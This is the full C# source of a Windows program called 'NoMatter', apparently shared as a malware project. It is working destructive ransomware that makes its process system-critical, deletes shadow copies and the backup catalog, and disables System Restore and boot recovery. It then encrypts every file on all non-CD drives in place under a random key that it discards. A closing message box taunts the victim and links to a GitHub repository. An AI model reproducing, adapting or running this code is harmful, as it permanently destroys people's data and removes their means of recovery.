using System;
using System.Buffers;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;


[assembly: AssemblyTitle("No even matter")]
[assembly: AssemblyDescription("Waiting...")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("Waiting...")]
[assembly: AssemblyProduct("Waiting...")]
[assembly: AssemblyCopyright("No one rights reserved.")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]
[assembly: ComVisible(false)]
[assembly: Guid("32c1176c-f625-4e2d-8c2f-7e9de8cec864")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]
[assembly: AssemblyInformationalVersion("goodluck with that")]

namespace NoMatter;

internal static class Program
{
    private static readonly string ExePath = Environment.ProcessPath ?? string.Empty;
    private static readonly string WindowsFolder = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
    
    private static readonly byte[] Key = RandomNumberGenerator.GetBytes(32);
    
    private static int _fileCount;
    private static int _processedCount;
    private static readonly Stopwatch Stopwatch = Stopwatch.StartNew();

    private const int NonceSize = 12;
    private const int TagSize = 16;
    private const int BufferSize = 1_048_576;

    [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int MessageBoxW(IntPtr hWnd, string lpText, string lpCaption, uint uType);

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(IntPtr Handle, int processInformationClass, ref int processInformation, int processInformationLength);

    // P/Invoke for AttachConsole / AllocConsole
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool AttachConsole(int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool AllocConsole();

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool FreeConsole();

    private const int ATTACH_PARENT_PROCESS = -1;
    private const uint MB_OK = 0x00000000;
    private const uint MB_YESNO = 0x00000004;
    private const uint MB_ICONINFORMATION = 0x00000040;
    private const uint MB_ICONWARNING = 0x00000030;
    private const uint MB_ICONQUESTION = 0x00000020;
    private const uint MB_TOPMOST = 0x00040000;
    private const int IDYES = 6;

    private static readonly bool HasConsole = DetectConsole();

    private static bool DetectConsole()
    {
        try
        {
            var stdout = Console.OpenStandardOutput(0);
            return stdout != Stream.Null;
        }
        catch
        {
            return false;
        }
    }

    public static async Task<int> Main(string[] args)
    {
        try
        {
            // Make process critical
            Process.EnterDebugMode();
            int isCritical = 1;
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int));

            // Delete shadow copies before encryption
            SafeLog("🗑️  Deleting shadow copies...");
            await DeleteShadowCopiesAsync().ConfigureAwait(false);
            SafeLog("✅ Shadow copies deleted.");

            await RunEncryptionAsync().ConfigureAwait(false);
            
            PrintFinalReport();
            return 0;
        }
        catch (Exception ex)
        {
            SafeLogError($"\n❌ Critical error: {ex.GetType().Name}");
            SafeLogError($"Message: {ex.Message}");
            SafeLogError($"Stack trace:\n{ex.StackTrace}");
            
            if (ex.InnerException != null)
            {
                SafeLogError($"\nInner exception: {ex.InnerException.GetType().Name}");
                SafeLogError($"Message: {ex.InnerException.Message}");
            }
            
            WaitForExit();
            return -1;
        }
        finally
        {
            Stopwatch.Stop();
            
            // Remove critical process status after all operations completed
            int isCritical = 0;
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int));
            Process.LeaveDebugMode();
        }
    }

    private static void SafeLog(string message)
    {
        if (HasConsole)
        {
            try { Console.WriteLine(message); } catch { }
        }
    }

    private static void SafeLogError(string message)
    {
        if (HasConsole)
        {
            try { Console.Error.WriteLine(message); } catch { }
        }
    }


    private static void WaitForExit()
    {
        if (HasConsole)
        {
            try
            {
                Console.WriteLine("\nPress any key to exit...");
                Console.ReadKey();
            }
            catch { }
        }
    }

    // === Shadow copy deletion ===

    private static async Task DeleteShadowCopiesAsync()
    {
        var tasks = new List<Task>();

        tasks.Add(Task.Run(() => ExecuteCommand("vssadmin.exe", "delete shadows /all /quiet")));
        tasks.Add(Task.Run(() => ExecuteCommand("wbadmin.exe", "delete catalog -quiet")));

        var drives = DriveInfo.GetDrives()
            .Where(d => d.IsReady && d.DriveType == DriveType.Fixed)
            .Select(d => d.RootDirectory.FullName);

        foreach (var drive in drives)
        {
            var driveLetter = drive.TrimEnd('\\');
            tasks.Add(Task.Run(() => ExecuteCommand("wmic.exe", $"/namespace:\\\\root\\default path SystemRestore call Disable \"{driveLetter}\"")));
        }

        tasks.Add(Task.Run(() => ExecuteCommand("bcdedit.exe", "/set {default} bootstatuspolicy ignoreallfailures")));
        tasks.Add(Task.Run(() => ExecuteCommand("bcdedit.exe", "/set {default} recoveryenabled no")));

        await Task.WhenAll(tasks).ConfigureAwait(false);
    }

    private static void ExecuteCommand(string fileName, string arguments)
    {
        try
        {
            var processStartInfo = new ProcessStartInfo
            {
                FileName = fileName,
                Arguments = arguments,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            using var process = Process.Start(processStartInfo);
            process?.WaitForExit(30000);
        }
        catch
        {
            // ignore
        }
    }

    // === Final msgbox ===

    private static void PrintFinalReport()
    {
        var processedCount = Interlocked.CompareExchange(ref _processedCount, 0, 0);
        var elapsedMs = Stopwatch.ElapsedMilliseconds;
        var encryptionKey = Convert.ToHexString(Key);
        
        string line1 = $"Congratulations!11!! Encryption completed successfully, {processedCount} files were encrypted. Total time: {elapsedMs}ms.";
        string line2 = $"Your unique decryption key: oopss.. Actually I forgot it.. Well, try to fix it.. ";
        string line3 = $"possibly thats help, not sure..https://github.com/EZIKALEXANDR/NoMatter ";

        MessageBoxW(IntPtr.Zero, $"{line1}\n\n{line2}\n\n{line3}", "NoMatter", MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
    }

    // === Encryption pipeline ===

    private static async Task RunEncryptionAsync()
    {
        var files = new ConcurrentQueue<string>();
        var drives = DriveInfo.GetDrives()
            .Where(d => d.IsReady && d.DriveType != DriveType.CDRom)
            .Select(d => d.RootDirectory.FullName)
            .ToArray();

        if (drives.Length == 0)
        {
            SafeLog("No suitable drives found.");
            return;
        }

        SafeLog($" Scanning {drives.Length} drives...");
        
        var collectTasks = drives.Select(drive => Task.Run(() => 
        {
            try { CollectFilesOptimized(drive, files); }
            catch (Exception ex) { SafeLogError($"Error scanning {drive}: {ex.Message}"); }
        })).ToArray();
        
        await Task.WhenAll(collectTasks).ConfigureAwait(false);

        var fileCount = files.Count;
        Interlocked.Exchange(ref _fileCount, fileCount);
        
        if (fileCount == 0)
        {
            SafeLog("No files found for processing.");
            return;
        }

        SafeLog($" Found {fileCount} files for processing");

        var maxThreads = Math.Min(Environment.ProcessorCount * 2, 32);
        var parallelOptions = new ParallelOptions 
        { 
            MaxDegreeOfParallelism = maxThreads,
            CancellationToken = CancellationToken.None 
        };

        var partitioner = Partitioner.Create(files, EnumerablePartitionerOptions.NoBuffering);

        using var aes = new AesGcm(Key, TagSize);
        using var rng = RandomNumberGenerator.Create();

        await Task.Run(() =>
        {
            Parallel.ForEach(partitioner, parallelOptions, file =>
            {
                try
                {
                    EncryptFileGCM(file, aes, rng);
                    Interlocked.Increment(ref _processedCount);
                }
                catch (UnauthorizedAccessException) { }
                catch (IOException) { }
                catch (CryptographicException) { }
            });
        }, CancellationToken.None).ConfigureAwait(false);
    }

    private static void CollectFilesOptimized(string path, ConcurrentQueue<string> queue)
    {
        if (path.StartsWith(WindowsFolder, StringComparison.OrdinalIgnoreCase))
            return;

        try
        {
            var files = Directory.EnumerateFiles(path).ToArray();
            foreach (var file in files)
            {
                if (ShouldSkipFile(file))
                    continue;
                queue.Enqueue(file);
            }

            var dirs = Directory.EnumerateDirectories(path).ToArray();
            if (dirs.Length > 0)
            {
                Parallel.ForEach(dirs, dir => 
                {
                    try { CollectFilesOptimized(dir, queue); }
                    catch { }
                });
            }
        }
        catch { }
    }

    [MethodImpl(MethodImplOptions.AggressiveInlining)]
    private static bool ShouldSkipFile(string filePath)
    {
        return filePath.Equals(ExePath, StringComparison.OrdinalIgnoreCase) ||
               filePath.EndsWith(".tmp", StringComparison.OrdinalIgnoreCase) ||
               filePath.EndsWith(".log", StringComparison.OrdinalIgnoreCase) ||
               filePath.EndsWith(".enc.tmp", StringComparison.OrdinalIgnoreCase);
    }

    private static void EncryptFileGCM(string filePath, AesGcm aes, RandomNumberGenerator rng)
    {
        var tempPath = filePath + ".enc.tmp";
        
        var fileInfo = new FileInfo(filePath);
        if (fileInfo.Length == 0)
            return;

        var inputBuffer = ArrayPool<byte>.Shared.Rent(BufferSize);
        var outputBuffer = ArrayPool<byte>.Shared.Rent(BufferSize);
        Span<byte> nonce = stackalloc byte[NonceSize];
        Span<byte> tag = stackalloc byte[TagSize];
        
        try
        {
            rng.GetBytes(nonce);
            
            using var inputFile = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read, BufferSize, FileOptions.SequentialScan);
            using var outputFile = new FileStream(tempPath, FileMode.Create, FileAccess.Write, FileShare.None, BufferSize, FileOptions.SequentialScan);
            
            outputFile.Write(nonce);
            outputFile.Position += TagSize;
            
            int bytesRead;
            
            while ((bytesRead = inputFile.Read(inputBuffer.AsSpan(0, BufferSize))) > 0)
            {
                var inputSpan = inputBuffer.AsSpan(0, bytesRead);
                var outputSpan = outputBuffer.AsSpan(0, bytesRead);
                
                aes.Encrypt(nonce, inputSpan, outputSpan, tag, associatedData: default);
                
                outputFile.Write(outputSpan);
            }
            
            outputFile.Position = NonceSize;
            outputFile.Write(tag);
            
            inputFile.Close();
            outputFile.Close();
            
            File.Delete(filePath);
            File.Move(tempPath, filePath);
        }
        finally
        {
            ArrayPool<byte>.Shared.Return(inputBuffer);
            ArrayPool<byte>.Shared.Return(outputBuffer);
        }
    }
}